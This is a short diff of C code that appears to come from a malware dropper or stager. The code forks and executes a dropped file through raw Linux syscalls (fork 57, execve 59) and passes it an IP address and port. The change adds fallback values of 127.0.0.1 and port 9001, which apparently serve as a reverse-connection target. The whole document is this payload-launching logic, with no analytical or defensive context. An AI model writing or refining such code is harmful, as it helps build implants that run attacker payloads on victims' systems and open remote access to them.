@@ -130,10 +130,18 @@ void c_main(long* stack_ptr) {
         if (has_data) {
             long pid = my_syscall(57, 0, 0, 0, 0, 0, 0);
             if (pid == 0) {
-                char* next_argv[] = {(char*)drop_path, arg_ip, arg_port, NULL};
+                char* pass_ip = arg_ip ? arg_ip : "127.0.0.1";
+                char* pass_port = arg_port ? arg_port : "9001";
+                char* next_argv[] = {
+                    (char*)drop_path, 
+                    pass_ip, 
+                    pass_port, 
+                    NULL
+                };
                 char* envp[] = {NULL};
                 my_syscall(59, (long)drop_path, (long)next_argv, (long)envp, 0, 0, 0);
-                my_exit(1);
+                my_exit(1); 
+
             }
             my_exit(0);
         }
